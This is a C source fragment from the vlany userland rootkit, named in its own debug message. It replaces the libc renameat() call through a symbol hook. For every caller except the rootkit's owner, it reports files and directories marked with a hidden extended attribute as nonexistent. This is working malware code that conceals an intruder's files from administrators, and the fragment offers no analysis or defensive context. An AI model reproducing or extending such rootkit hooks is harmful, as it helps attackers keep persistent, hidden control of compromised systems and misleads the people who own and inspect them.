int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath)
{
    #ifdef DEBUG
        printf("[vlany] renameat() called\n");
    #endif

    HOOK(old_renameat, CRENAMEAT);

    if(owned()) return old_renameat(olddirfd, oldpath, newdirfd, newpath);

    if((hidden_xattr(oldpath) || hidden_xattr(newpath) || hidden_fxattr(olddirfd) || hidden_fxattr(newdirfd))) { errno = ENOENT; return -1; }

    return old_renameat(olddirfd, oldpath, newdirfd, newpath);
}
